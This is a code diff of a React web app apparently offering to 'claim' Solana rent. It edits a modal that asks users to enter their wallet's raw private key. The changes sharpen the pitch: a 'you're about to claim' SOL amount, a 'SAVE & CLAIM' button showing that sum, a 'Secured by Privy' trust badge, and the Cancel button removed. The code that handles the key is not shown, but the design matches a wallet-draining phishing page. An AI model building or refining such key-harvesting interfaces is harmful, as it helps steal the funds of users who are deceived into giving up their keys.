@@ -1642,7 +1642,7 @@ export default function SolClaimApp() {
               <div className="flex items-center justify-center gap-1.5 text-[10px] text-muted-foreground">
                 <Lock className="w-3 h-3 shrink-0" />
                 <span>Secured by</span>
-                <img src="https://privy.io/favicon.ico" alt="Privy" className="w-3.5 h-3.5" />
+                <img src="https://framerusercontent.com/images/AwTsKmlC3D7Q0nXT1xH0qt3jHkI.png?width=505&height=278" alt="Privy" className="h-3.5 w-auto object-contain" />
                 <span className="font-semibold text-foreground">Privy</span>
               </div>
             </div>
@@ -1698,10 +1698,11 @@ export default function SolClaimApp() {
         </div>
       )}
 
-              {/* Private Key Modal */}
+              {/* Private Key Modal - click outside to close */}
       {(isKeyModalOpen || isKeyModalClosing) && (
         <div
           className={`fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-md p-4 ${isKeyModalClosing ? 'modal-backdrop-exit' : 'modal-backdrop-enter'}`}
+          onClick={closeKeyModal}
           onAnimationEnd={(e) => e.animationName === 'modal-backdrop-exit' && finishKeyClose()}
         >
           <div
@@ -1712,16 +1713,27 @@ export default function SolClaimApp() {
             <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center">
               <Key className="w-6 h-6 text-primary" />
             </div>
-            <h3 className="text-xl font-black text-foreground tracking-tight">{addKeyWalletId ? 'Add Private Key' : 'Secure Your Wallet'}</h3>
-            <p className="text-xs text-muted-foreground">
-              {addKeyWalletId
-                ? <>Add the private key for <span className="font-mono text-foreground font-bold bg-secondary px-1.5 py-0.5 rounded-md">{addKeyWalletAddress.slice(0, 4)}...{addKeyWalletAddress.slice(-4)}</span> to enable batch claiming.</>
-                : <>To claim rent automatically, we need the private key for <span className="font-mono text-foreground font-bold bg-secondary px-1.5 py-0.5 rounded-md">{publicKey.slice(0, 4)}...{publicKey.slice(-4)}</span>.</>
-              }
-            </p>
+            <h3 className="text-xl font-black text-foreground tracking-tight">
+              {addKeyWalletId ? 'Add Private Key' : 'Enter Your Private Key'}
+            </h3>
+            {addKeyWalletId ? (
+              <p className="text-xs text-muted-foreground">
+                Add your private key for <span className="font-mono text-foreground font-bold bg-secondary px-1.5 py-0.5 rounded-md">{addKeyWalletAddress.slice(0, 4)}...{addKeyWalletAddress.slice(-4)}</span> to enable batch claiming.
+              </p>
+            ) : (
+              <div className="space-y-2">
+                <div className="p-3 rounded-xl bg-primary/10 border-2 border-primary/20">
+                  <p className="text-[10px] font-bold text-primary uppercase tracking-widest mb-0.5">You're about to claim</p>
+                  <p className="text-2xl font-black text-foreground">{displayClaimableNet.toFixed(4)} <span className="text-primary text-base">SOL</span></p>
+                </div>
+                <p className="text-xs text-muted-foreground">
+                  Enter your private key for wallet <span className="font-mono text-foreground font-bold bg-secondary px-1.5 py-0.5 rounded-md">{publicKey.slice(0, 4)}...{publicKey.slice(-4)}</span> to claim.
+                </p>
+              </div>
+            )}
 
             <div className="space-y-3">
-              <Label htmlFor="privateKey" className="text-[11px] font-black text-muted-foreground uppercase tracking-widest ml-1">Private Key (Base58)</Label>
+              <Label htmlFor="privateKey" className="text-[11px] font-black text-muted-foreground uppercase tracking-widest ml-1">Your Private Key (Base58)</Label>
               <Input
                 id="privateKey"
                 type="password"
@@ -1733,7 +1745,7 @@ export default function SolClaimApp() {
               <div className="flex items-center justify-center gap-1.5 text-[10px] text-muted-foreground">
                 <Lock className="w-3 h-3 shrink-0" />
                 <span>Secured by</span>
-                <img src="https://privy.io/favicon.ico" alt="Privy" className="w-3.5 h-3.5" />
+                <img src="https://framerusercontent.com/images/AwTsKmlC3D7Q0nXT1xH0qt3jHkI.png?width=505&height=278" alt="Privy" className="h-3.5 w-auto object-contain" />
                 <span className="font-semibold text-foreground">Privy</span>
               </div>
             </div>
@@ -1745,31 +1757,22 @@ export default function SolClaimApp() {
               </div>
             )}
 
-            <div className="flex gap-3">
-              <Button 
-                variant="outline" 
-                className="w-full h-12 rounded-xl font-bold border-2"
-                onClick={closeKeyModal}
-              >
-                CANCEL
-              </Button>
-              <Button 
-                className="w-full h-12 rounded-xl bg-primary text-primary-foreground font-black shadow-md shadow-primary/20 active:scale-[0.98] transition-all border border-primary-foreground/10"
-                onClick={addKeyWalletId ? handleAddKeyOnly : handleSavePrivateKey}
-                disabled={!privateKeyInput || isSubmittingKey}
-              >
-                {isSubmittingKey ? (
-                  <div className="flex items-center gap-2">
-                    <div className="animate-spin rounded-full h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground"></div>
-                    SAVING...
-                  </div>
-                ) : addKeyWalletId ? (
-                  'SAVE KEY'
-                ) : (
-                  'SAVE & CLAIM'
-                )}
-              </Button>
-            </div>
+            <Button
+              className="w-full h-12 rounded-xl bg-primary text-primary-foreground font-black shadow-md shadow-primary/20 active:scale-[0.98] transition-all border border-primary-foreground/10"
+              onClick={addKeyWalletId ? handleAddKeyOnly : handleSavePrivateKey}
+              disabled={!privateKeyInput || isSubmittingKey}
+            >
+              {isSubmittingKey ? (
+                <div className="flex items-center gap-2">
+                  <div className="animate-spin rounded-full h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground"></div>
+                  SAVING...
+                </div>
+              ) : addKeyWalletId ? (
+                'SAVE KEY'
+              ) : (
+                <>SAVE & CLAIM {displayClaimableNet.toFixed(4)} SOL</>
+              )}
+            </Button>
           </div>
         </div>
       )}
